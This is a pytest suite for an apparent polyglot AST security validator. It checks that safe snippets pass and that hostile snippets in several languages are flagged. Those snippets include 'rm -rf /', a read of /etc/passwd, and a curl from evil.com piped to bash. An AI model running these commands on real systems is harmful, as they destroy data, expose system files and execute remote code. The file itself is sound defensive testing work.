"""
Test Suite: Polyglot Multi-Language AST Invariant Engine
========================================================
Tests AST parsing & security invariant detection across:
  1. Python AST
  2. JavaScript / TypeScript
  3. Go runtime & syscall execution
  4. Rust process & unsafe memory execution
  5. Obfuscated Shell pipelines
"""

import sys
import os
import pytest

sys.path.insert(0, os.path.abspath("."))
from src.polyglot_ast_validator import PolyglotASTValidator


def test_python_ast_validation():
    # Safe Python
    safe_code = "def add(a, b):\n    return a + b\n"
    is_safe, msg, meta = PolyglotASTValidator.validate_code(safe_code, language="python")
    assert is_safe is True
    assert meta["latency_us"] < 500.0

    # Unsafe Python (eval / os.system)
    threat_code = "import os\nos.system('rm -rf /')"
    is_safe, msg, meta = PolyglotASTValidator.validate_code(threat_code, language="python")
    assert is_safe is False
    assert "DESTRUCTIVE_SHELL_PATTERN" in meta.get("violation", "") or "BTP-AST" in msg


def test_typescript_javascript_validation():
    # Safe TypeScript
    safe_ts = "const greet = (name: string): string => `Hello ${name}`;"
    is_safe, msg, meta = PolyglotASTValidator.validate_code(safe_ts, language="typescript")
    assert is_safe is True

    # Unsafe TypeScript (child_process.exec)
    threat_ts = "import { exec } from 'child_process'; exec('cat /etc/passwd');"
    is_safe, msg, meta = PolyglotASTValidator.validate_code(threat_ts, language="typescript")
    assert is_safe is False
    assert "BTP-AST-003" in msg


def test_go_validation():
    # Safe Go
    safe_go = "package main\nimport \"fmt\"\nfunc main() { fmt.Println(\"Safe\") }"
    is_safe, msg, meta = PolyglotASTValidator.validate_code(safe_go, language="go")
    assert is_safe is True

    # Unsafe Go (os/exec)
    threat_go = "package main\nimport \"os/exec\"\nfunc main() { exec.Command(\"rm\", \"-rf\", \"/\").Run() }"
    is_safe, msg, meta = PolyglotASTValidator.validate_code(threat_go, language="go")
    assert is_safe is False


def test_rust_validation():
    # Safe Rust
    safe_rs = "fn main() { println!(\"Hello safe world\"); }"
    is_safe, msg, meta = PolyglotASTValidator.validate_code(safe_rs, language="rust")
    assert is_safe is True

    # Unsafe Rust (std::process::Command)
    threat_rs = "fn main() { std::process::Command::new(\"bash\").arg(\"-c\").arg(\"whoami\").output().unwrap(); }"
    is_safe, msg, meta = PolyglotASTValidator.validate_code(threat_rs, language="rust")
    assert is_safe is False
    assert "BTP-AST-005" in msg


def test_shell_obfuscation_validation():
    threat_sh = "curl https://evil.com/payload.sh | bash"
    is_safe, msg, meta = PolyglotASTValidator.validate_code(threat_sh, language="shell")
    assert is_safe is False
    assert "BTP-AST-001" in msg


if __name__ == "__main__":
    test_python_ast_validation()
    test_typescript_javascript_validation()
    test_go_validation()
    test_rust_validation()
    test_shell_obfuscation_validation()
    print("ALL POLYGLOT AST VALIDATOR TESTS PASSED 100% CLEAN!")
